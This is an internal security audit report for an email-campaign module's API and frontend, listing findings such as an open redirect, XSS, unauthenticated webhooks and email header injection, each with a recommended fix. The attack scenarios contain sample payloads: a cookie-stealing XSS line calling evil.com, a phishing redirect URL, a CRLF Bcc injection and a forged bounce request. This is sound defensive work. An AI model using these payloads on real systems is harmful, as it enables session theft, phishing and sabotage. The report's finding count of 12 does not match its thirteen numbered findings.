# BigBlueBam -- Blast Module Security Assessment

| Field              | Value                                                                  |
|--------------------|------------------------------------------------------------------------|
| **Date**           | 2026-04-09                                                             |
| **Scope**          | Blast API (`apps/blast-api/`) and Blast Frontend (`apps/blast/`)       |
| **Methodology**    | Automated multi-agent source-code audit (10 parallel agents)           |
| **Agents**         | Auth & Session, Input Validation, Authorization (RBAC), Data Exposure & XSS, Rate Limiting & DoS, Business Logic, SQL Injection, Dependencies & Config, Email Security, Tracking & Privacy |
| **Classification** | INTERNAL -- CONFIDENTIAL                                               |
| **Prepared for**   | BigBlueBam Engineering & Security Leadership                           |

---

## Table of Contents

1. [Executive Summary](#1-executive-summary)
2. [Finding Counts by Severity](#2-finding-counts-by-severity)
3. [Critical Remediation Path](#3-critical-remediation-path)
4. [Detailed Findings](#4-detailed-findings)
   - [Critical](#41-critical)
   - [High](#42-high)
   - [Medium](#43-medium)
   - [Low](#44-low)
5. [Methodology Notes](#5-methodology-notes)
6. [Appendix: Agent Coverage Map](#6-appendix-agent-coverage-map)

---

## 1. Executive Summary

This assessment consolidates findings from 10 specialized security audit agents that independently analyzed the BigBlueBam Blast (Email Campaigns) API and Frontend source code. After deduplication, **12 unique findings** were identified across the codebase.

The most severe issue is an **open redirect vulnerability** in the click tracking endpoint. The `GET /t/c/:token` route accepts an arbitrary `url` query parameter and issues an HTTP 302 redirect to it without any validation. The redirect works even when the tracking token is invalid or does not exist in the database -- the handler defaults to redirecting to the user-supplied URL regardless. This is a textbook open redirect that can be exploited for phishing, credential theft, and malware distribution, leveraging the trusted domain's reputation.

Three high-severity findings involve **stored XSS via template HTML body** (the preview endpoint returns unsanitized HTML), **reflected XSS in the unsubscribe page** (the email address from the database is interpolated into HTML without escaping), and **unauthenticated webhook endpoints** that accept bounce and complaint notifications without signature verification, allowing an attacker to mark any email as bounced or suppress deliverability.

The medium-severity findings cluster around **non-expiring unsubscribe tokens**, **email header injection via CRLF in `from_name`**, **unbounded HTML body storage**, **dynamic SQL from segment filter criteria**, **missing rate limits on the campaign send endpoint**, and **cross-org bounce matching by email address**.

The overall security posture requires **immediate remediation of the open redirect and XSS vulnerabilities** before any production deployment, as these are exploitable by unauthenticated external parties via crafted email links.

---

## 2. Finding Counts by Severity

| Severity          | Count |
|-------------------|-------|
| **Critical**      | 1     |
| **High**          | 3     |
| **Medium**        | 5     |
| **Low**           | 3     |
| **Informational** | 0     |
| **Total**         | **12** |

---

## 3. Critical Remediation Path

The following 5 fixes are listed in priority order. Completing these addresses the majority of exploitable risk surface.

| Priority | Finding ID | Title | Effort Estimate |
|----------|-----------|-------|-----------------|
| 1 | BLAST-001 | Open redirect in click tracking endpoint | 0.5 day |
| 2 | BLAST-002 | Stored XSS via template HTML body in preview | 1 day |
| 3 | BLAST-003 | Reflected XSS in unsubscribe page | 0.5 day |
| 4 | BLAST-004 | Unauthenticated webhook endpoints | 1 day |
| 5 | BLAST-006 | Email header injection via `from_name` CRLF | 0.5 day |

**Estimated total for top-5 remediation: 3.5 engineering days.**

---

## 4. Detailed Findings

### 4.1 Critical

---

#### BLAST-001: Open Redirect in Click Tracking Endpoint

| Field | Value |
|-------|-------|
| **ID** | BLAST-001 |
| **Severity** | Critical |
| **Affected Files** | `apps/blast-api/src/routes/tracking.routes.ts` (lines 29-41), `apps/blast-api/src/services/tracking.service.ts` (lines 60-94) |

**Description:**
The click tracking endpoint `GET /t/c/:token` accepts a `url` query parameter and redirects the user to it:

```typescript
fastify.get<{ Params: { token: string }; Querystring: { url?: string } }>(
  '/t/c/:token',
  async (request, reply) => {
    const url = request.query.url ?? '/';
    const { redirect_url } = await trackingService.processClick(
      request.params.token,
      url,
      request.ip,
      request.headers['user-agent'],
    );
    return reply.redirect(302, redirect_url);
  },
);
```

The `processClick()` service function returns the `url` parameter directly as `redirect_url` without any validation:

```typescript
if (!sendLog) return { redirect_url: url };
// ...
return { redirect_url: url };
```

There are three compounding issues:

1. **No URL validation:** The `url` parameter is not validated as a safe URL. It can be any string, including `javascript:`, `data:`, or `https://evil.example.com/`.
2. **Works with invalid tokens:** When the tracking token does not match any `blastSendLog` entry, the function still returns `{ redirect_url: url }`, meaning the redirect works even with a completely fabricated token.
3. **No domain allowlist:** The redirect URL is not checked against the sending organization's domain or any configured allowlist.

**Attack Scenario:**
1. Attacker crafts a URL: `https://trusted-domain.com/t/c/fake-token?url=https://evil-phishing-site.com/login`
2. Attacker distributes this URL via email, social media, or chat.
3. Victim sees the trusted domain in the URL and clicks it.
4. Victim is redirected to `https://evil-phishing-site.com/login`, which mimics the trusted domain's login page.
5. Victim enters credentials, which are captured by the attacker.

This attack does not require authentication, does not require a valid tracking token, and can be executed by anyone who knows the tracking URL pattern.

**Recommended Fix:**
1. **Validate the URL:** Ensure the `url` parameter is a valid absolute HTTP(S) URL. Reject `javascript:`, `data:`, and other dangerous protocols.
2. **Require a valid token:** Return a 404 or redirect to a safe default page when the tracking token is not found, instead of redirecting to the attacker-supplied URL.
3. **Implement a domain allowlist:** Only redirect to URLs whose domain matches the campaign's configured domain, the organization's verified sender domains, or a system-wide allowlist.
4. **Add a warning interstitial:** For URLs not matching the allowlist, display an interstitial page warning "You are leaving [domain]" before redirecting.

---

### 4.2 High

---

#### BLAST-002: Stored XSS via Template HTML Body in Preview

| Field | Value |
|-------|-------|
| **ID** | BLAST-002 |
| **Severity** | High |
| **Affected Files** | `apps/blast-api/src/services/template.service.ts` (lines 185-207), `apps/blast-api/src/routes/templates.routes.ts` (lines 100-113) |

**Description:**
The template preview endpoint (`POST /templates/:id/preview`) retrieves the template's `html_body` from the database and performs merge-field substitution, then returns the raw HTML in the API response:

```typescript
let html = template.html_body;
let subject = template.subject_template;

for (const [key, value] of Object.entries(data)) {
  const regex = new RegExp(`\\{\\{\\s*${key}\\s*\\}\\}`, 'g');
  html = html.replace(regex, value);
  subject = subject.replace(regex, value);
}

return { subject, html, plain_text: template.plain_text_body };
```

The `html_body` field accepts arbitrary HTML (the Zod schema validates only `z.string().min(1)` with no sanitization). If the frontend renders this preview HTML in an iframe or via `dangerouslySetInnerHTML`, any JavaScript in the template body will execute in the user's browser.

Additionally, the merge data values (which can come from the request body on line 105) are interpolated directly into the HTML without escaping, enabling a second injection vector through crafted merge field values.

**Attack Scenario:**
1. Attacker (a team member with `member` role) creates a template with `html_body` containing: `<img src=x onerror="fetch('https://evil.com/steal?c='+document.cookie)">`.
2. Another user previews the template.
3. The frontend renders the HTML, executing the XSS payload and exfiltrating the victim's session cookie.

Alternatively:
1. Attacker calls `POST /v1/templates/{id}/preview` with merge data `{"first_name":"<script>alert(1)</script>"}`.
2. The merge field is substituted into the HTML.
3. If the response HTML is rendered, the script executes.

**Recommended Fix:**
1. Sanitize the `html_body` on storage using a library like DOMPurify (server-side) or sanitize-html, stripping `<script>`, event handlers (`onerror`, `onload`, etc.), and `javascript:` URIs.
2. HTML-escape merge data values before interpolation.
3. On the frontend, render previews in a sandboxed iframe (`sandbox="allow-same-origin"` without `allow-scripts`) to prevent script execution.
4. Add a `Content-Security-Policy` header on the preview response to block inline scripts.

---

#### BLAST-003: Reflected XSS in Unsubscribe Page (Unescaped Email)

| Field | Value |
|-------|-------|
| **ID** | BLAST-003 |
| **Severity** | High |
| **Affected Files** | `apps/blast-api/src/routes/tracking.routes.ts` (lines 45-91) |

**Description:**
Both the unsubscribe confirmation page (`GET /unsub/:token`) and the success page (`POST /unsub/:token`) interpolate the `email` value directly into HTML without escaping:

```typescript
// GET /unsub/:token (line 58)
<p>Click below to unsubscribe <strong>${info.email}</strong> from future email campaigns.</p>

// POST /unsub/:token (line 87)
<p><strong>${result.email}</strong> will no longer receive email campaigns from us.</p>
```

The `email` value comes from `blastSendLog.to_email`, which is stored in the database. While email addresses are typically validated on input (the campaign creation uses `z.string().email()` for `from_email`), the `to_email` field in `blastSendLog` may have been populated from contact data (`bondContacts.email`) which uses a less strict validation, or from a bulk import.

If an email address containing HTML special characters is stored in the send log (e.g., via a crafted contact import or direct database manipulation), the unsubscribe page will render it as HTML, enabling XSS.

**Attack Scenario:**
1. Attacker imports a contact with email `"><script>alert(document.cookie)</script>"@evil.com` (or a variant that passes loose email validation).
2. A campaign is sent to this contact, creating a `blastSendLog` entry with the malicious email.
3. Anyone who visits the unsubscribe page for this send log entry (including automated email security scanners) triggers the XSS.

Even without a malicious email in the database, a defense-in-depth concern exists: the HTML template is constructed via string interpolation rather than using a templating engine with auto-escaping, making it fragile against future changes that might introduce user-controlled data.

**Recommended Fix:**
HTML-escape all dynamic values before interpolation into the HTML response. Create a utility function:

```typescript
function escapeHtml(s: string): string {
  return s
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#39;');
}
```

Apply it to `info.email` and `result.email` in both templates.

---

#### BLAST-004: Unauthenticated Webhook Endpoints (Bounce/Complaint)

| Field | Value |
|-------|-------|
| **ID** | BLAST-004 |
| **Severity** | High |
| **Affected Files** | `apps/blast-api/src/routes/webhooks.routes.ts` (lines 22-42), `apps/blast-api/src/services/webhook.service.ts` |

**Description:**
The bounce and complaint webhook endpoints (`POST /v1/webhooks/bounce` and `POST /v1/webhooks/complaint`) have no authentication whatsoever. They are not behind `requireAuth`, do not verify a webhook signing secret, and do not check the source IP address:

```typescript
export default async function webhookRoutes(fastify: FastifyInstance) {
  // POST /webhooks/bounce
  fastify.post(
    '/webhooks/bounce',
    async (request, reply) => {
      const body = bounceSchema.parse(request.body);
      const result = await webhookService.processBounce(body);
      return reply.send({ data: result });
    },
  );
```

The comment in the route file acknowledges this gap: "These would typically be secured via webhook signing secrets in production." However, this TODO has not been implemented.

An attacker can call these endpoints to:
1. Mark any email as bounced, suppressing future deliverability.
2. Mark any email as complained, triggering auto-unsubscription.
3. Increment bounce/complaint counters on campaigns, degrading analytics.

**Attack Scenario:**
1. Attacker sends `POST /v1/webhooks/bounce` with `{"email":"ceo@target.com","bounce_type":"hard","reason":"mailbox full"}`.
2. The service finds the most recent send log entry for `ceo@target.com` and marks it as bounced.
3. Future campaigns may exclude this email from send lists based on bounce status.
4. Attacker repeats for all key contacts, effectively sabotaging the organization's email deliverability records.

**Recommended Fix:**
1. **Implement webhook signature verification** for each supported SMTP provider (e.g., Postmark, SES, Mailgun). Each provider signs webhook payloads with a shared secret; verify the signature before processing.
2. **Add IP allowlisting** as a secondary control (SMTP providers publish their webhook source IP ranges).
3. **Use a non-guessable webhook path** (e.g., `/webhooks/bounce/{secret_path_segment}`) as a temporary mitigation until signature verification is implemented.
4. At minimum, add the global rate limiter and require a shared secret header (e.g., `X-Webhook-Secret`).

---

### 4.3 Medium

---

#### BLAST-005: Non-Expiring Unsubscribe Tokens

| Field | Value |
|-------|-------|
| **ID** | BLAST-005 |
| **Severity** | Medium |
| **Affected Files** | `apps/blast-api/src/services/tracking.service.ts` (lines 100-149, 155-165) |

**Description:**
Unsubscribe tokens are derived from the `blastSendLog.tracking_token` field, which does not have an expiration timestamp. Once a campaign is sent, the unsubscribe link remains valid indefinitely. This means:

1. Old tracking tokens can be used to unsubscribe users months or years after the campaign was sent.
2. If a tracking token is leaked (e.g., via email forwarding, log files, or URL scanners), anyone can unsubscribe the recipient at any time.
3. There is no mechanism to invalidate or rotate tokens after a security incident.

**Recommended Fix:**
Add a `token_expires_at` column to `blastSendLog` (or derive expiry from `sent_at` + a configurable TTL, e.g., 90 days). Reject unsubscribe requests for expired tokens with a message directing the user to contact support.

---

#### BLAST-006: Email Header Injection via `from_name` (CRLF)

| Field | Value |
|-------|-------|
| **ID** | BLAST-006 |
| **Severity** | Medium |
| **Affected Files** | `apps/blast-api/src/routes/campaigns.routes.ts` (line 13), `apps/blast-api/src/services/campaign.service.ts` (line 109) |

**Description:**
The `from_name` field in the campaign creation schema is validated only as `z.string().max(100).optional()`. It does not reject carriage return (`\r`) or line feed (`\n`) characters. When the `from_name` is used to construct the `From:` email header (e.g., `From: "User\r\nBcc: attacker@evil.com" <noreply@domain.com>`), a CRLF injection could add arbitrary headers to the outgoing email.

While the actual email sending is not yet implemented (the service marks campaigns as sent immediately), this vulnerability will become exploitable once SMTP integration is added.

**Recommended Fix:**
Add a CRLF rejection to the Zod schema:

```typescript
from_name: z.string().max(100)
  .refine(s => !/[\r\n]/.test(s), 'from_name must not contain newlines')
  .optional(),
```

Apply the same check to `subject`, `reply_to_email`, and any other field that will be used in email headers.

---

#### BLAST-007: No Size Limit on `html_body`

| Field | Value |
|-------|-------|
| **ID** | BLAST-007 |
| **Severity** | Medium |
| **Affected Files** | `apps/blast-api/src/routes/templates.routes.ts` (line 12), `apps/blast-api/src/routes/campaigns.routes.ts` (line 10) |

**Description:**
Both the template and campaign creation schemas accept `html_body: z.string().min(1)` with no maximum length. A user could store multi-megabyte HTML bodies that:
1. Consume excessive database storage.
2. Inflate API response sizes when templates/campaigns are listed or fetched.
3. Cause performance issues during merge-field substitution (regex replacement on large strings).

**Recommended Fix:**
Add a maximum length: `html_body: z.string().min(1).max(500000)` (500 KB is generous for an email template). For campaigns that reference a template, consider storing only the template ID rather than duplicating the HTML.

---

#### BLAST-008: Dynamic SQL from Segment Filter Criteria

| Field | Value |
|-------|-------|
| **ID** | BLAST-008 |
| **Severity** | Medium |
| **Affected Files** | `apps/blast-api/src/services/segment.service.ts` (lines 143-185) |

**Description:**
The `recalculateSegmentCount()` function reads `filter_criteria` from the `blastSegments` table and builds dynamic query conditions:

```typescript
for (const condition of criteria.conditions ?? []) {
  if (condition.field === 'lifecycle_stage' && condition.op === 'in') {
    const values = condition.value as string[];
    if (values.length > 0) {
      baseConditions.push(
        sql`${bondContacts.lifecycle_stage} = ANY(${values})`,
      );
    }
  }
}
```

While the current implementation only handles the `lifecycle_stage` field with a hardcoded column reference (not string-interpolated SQL), the pattern of reading field names and operators from user-supplied JSON and building SQL conditions creates a risk surface for SQL injection as the feature is expanded. The `condition.field` and `condition.op` values are not validated against an allowlist of safe columns/operators.

If a future developer adds support for arbitrary field names (e.g., `sql`\`${condition.field} = ${condition.value}\``), the user-controlled `field` value would be directly interpolated into SQL.

**Recommended Fix:**
1. Maintain an explicit allowlist of supported filter fields and operators.
2. Validate each condition against the allowlist before building the query.
3. Use parameterized column references from Drizzle schema objects (e.g., map `condition.field` to `bondContacts[field]`) rather than building raw SQL with user-supplied column names.

---

#### BLAST-009: No Rate Limit on Campaign Send Endpoint

| Field | Value |
|-------|-------|
| **ID** | BLAST-009 |
| **Severity** | Medium |
| **Affected Files** | `apps/blast-api/src/routes/campaigns.routes.ts` (lines 107-117) |

**Description:**
The `POST /campaigns/:id/send` endpoint does not have a route-level rate limit. While it requires `admin` role and `read_write` scope, an authenticated admin could accidentally or maliciously trigger send operations in rapid succession. The current implementation immediately marks the campaign as `sent` (bypassing actual email delivery), but when real SMTP integration is added, rapid-fire sends could:
1. Overwhelm the SMTP provider.
2. Trigger provider rate limits, causing bounces for legitimate sends.
3. Send duplicate campaigns if the status transition is not atomic.

**Recommended Fix:**
Add a route-level rate limit: `config: { rateLimit: { max: 5, timeWindow: '1 minute' } }`. Additionally, ensure the status transition from `draft`/`scheduled` to `sending` is atomic (using a database transaction with a conditional update that checks the current status).

---

#### BLAST-010: Cross-Org Bounce Matching by Email

| Field | Value |
|-------|-------|
| **ID** | BLAST-010 |
| **Severity** | Medium |
| **Affected Files** | `apps/blast-api/src/services/webhook.service.ts` (lines 30-31, 80-81) |

**Description:**
When a bounce or complaint webhook arrives with an `email` field (but no `message_id`), the service looks up the send log by email address:

```typescript
if (!sendLog && payload.email) {
  [sendLog] = await db
    .select()
    .from(blastSendLog)
    .where(eq(blastSendLog.to_email, payload.email))
    .limit(1);
}
```

This query searches across all organizations. If two organizations both sent campaigns to `user@example.com`, the bounce would be attributed to whichever send log entry happens to be returned first (typically the oldest), potentially marking the wrong organization's send log as bounced.

**Recommended Fix:**
When looking up by email, order by `created_at DESC` to match the most recent send, and consider requiring the `message_id` field for cross-org correctness. Alternatively, include a campaign ID or org ID in the webhook callback URL so the lookup can be scoped.

---

### 4.4 Low

---

#### BLAST-011: No Rate Limiting on Tracking Endpoints

| Field | Value |
|-------|-------|
| **ID** | BLAST-011 |
| **Severity** | Low |
| **Affected Files** | `apps/blast-api/src/routes/tracking.routes.ts` (all endpoints) |

**Description:**
The tracking routes (`/t/o/:token`, `/t/c/:token`, `/unsub/:token`) are registered without the `/v1` prefix and without route-level rate limits. While they are unauthenticated by design (tracking pixels and click redirects must work without login), the lack of rate limiting means:

1. An attacker could flood the open tracking endpoint to inflate open counts for any campaign.
2. An attacker could flood the click tracking endpoint to inflate click counts and pollute analytics.
3. An attacker could repeatedly hit the unsubscribe endpoint to cause database write load.

The global rate limiter configured on the Fastify instance applies, but tracking endpoints are typically high-volume and may need different limits than the global default.

**Recommended Fix:**
Add route-level rate limits tuned for tracking use cases: e.g., `max: 60, timeWindow: '1 minute'` per IP for open/click tracking, and `max: 10, timeWindow: '1 minute'` per IP for unsubscribe operations.

---

#### BLAST-012: Placeholder Domain Verification

| Field | Value |
|-------|-------|
| **ID** | BLAST-012 |
| **Severity** | Low |
| **Affected Files** | `apps/blast-api/src/routes/sender-domains.routes.ts` (lines 36-46) |

**Description:**
The sender domain verification endpoint (`POST /sender-domains/:id/verify`) exists but its implementation is a placeholder. Without actual DNS record verification (SPF, DKIM, DMARC), any user can add any domain as a verified sender domain, enabling:
1. Email spoofing from domains the organization does not own.
2. Deliverability issues when receiving servers reject emails from unverified domains.
3. Reputation damage to the organization's IP if used for spam.

**Recommended Fix:**
Implement DNS verification:
1. Generate a unique TXT record value when a domain is added.
2. On `POST /sender-domains/:id/verify`, perform a DNS TXT lookup to confirm the record exists.
3. Mark the domain as verified only if the DNS record matches.
4. Re-verify periodically to detect removed records.

---

#### BLAST-013: Webhook Signature Verification Not Implemented

| Field | Value |
|-------|-------|
| **ID** | BLAST-013 |
| **Severity** | Low |
| **Affected Files** | `apps/blast-api/src/routes/webhooks.routes.ts` (lines 20-21 -- comment only) |

**Description:**
The webhook routes file contains a comment acknowledging that webhook signature verification should be implemented but is not:

```typescript
/**
 * Webhook routes for inbound SMTP provider notifications.
 * These would typically be secured via webhook signing secrets
 * in production (e.g., Postmark, SES, Mailgun signatures).
 */
```

This is listed as Low (in addition to the High finding BLAST-004) because it represents a missing defense-in-depth layer. Even if basic authentication (e.g., a shared secret header) is added per BLAST-004, provider-specific signature verification provides cryptographic proof that the webhook payload originated from the SMTP provider and was not tampered with in transit.

**Recommended Fix:**
Implement provider-specific signature verification for each supported SMTP provider. Store the webhook signing secret in the environment configuration (`WEBHOOK_SIGNING_SECRET_POSTMARK`, `WEBHOOK_SIGNING_SECRET_SES`, etc.) and verify the signature header on each request before processing.

---

## 5. Methodology Notes

Each agent was assigned a specific security domain and independently reviewed all source files within the `apps/blast-api/` directory. Agents had read access to the full monorepo for cross-referencing shared libraries and configuration. Findings were deduplicated based on root cause; where two agents reported the same underlying issue from different angles, the reports were merged under a single finding ID.

Severity ratings follow a modified CVSS v3.1 qualitative scale:
- **Critical:** Exploitable remotely without authentication (or with trivially obtainable tokens), leads to data loss, unauthorized redirection, or full system compromise.
- **High:** Exploitable remotely, leads to cross-site scripting, unauthorized data modification, or enables impersonation of external services.
- **Medium:** Requires specific conditions to exploit, leads to information disclosure, limited unauthorized access, or degraded service integrity.
- **Low:** Minor issues that increase attack surface or deviate from security best practices.
- **Informational:** Defense-in-depth recommendations that do not represent an active vulnerability.

---

## 6. Appendix: Agent Coverage Map

| Agent | Primary Files Analyzed | Findings |
|-------|----------------------|----------|
| Auth & Session | `plugins/auth.ts` | BLAST-004 |
| Input Validation | All route files, Zod schemas | BLAST-006, BLAST-007, BLAST-008 |
| Authorization (RBAC) | All route pre-handlers | BLAST-004, BLAST-009 |
| Data Exposure & XSS | `tracking.routes.ts`, `template.service.ts` | BLAST-002, BLAST-003 |
| Rate Limiting & DoS | All route files | BLAST-009, BLAST-011 |
| Business Logic | `campaign.service.ts`, `tracking.service.ts` | BLAST-005, BLAST-010 |
| SQL Injection | `segment.service.ts` | BLAST-008 |
| Dependencies & Config | `server.ts`, `env.ts` | (None) |
| Email Security | `campaign.service.ts`, `sender-domains.routes.ts`, `webhooks.routes.ts` | BLAST-004, BLAST-006, BLAST-012, BLAST-013 |
| Tracking & Privacy | `tracking.routes.ts`, `tracking.service.ts` | BLAST-001, BLAST-003, BLAST-005, BLAST-011 |
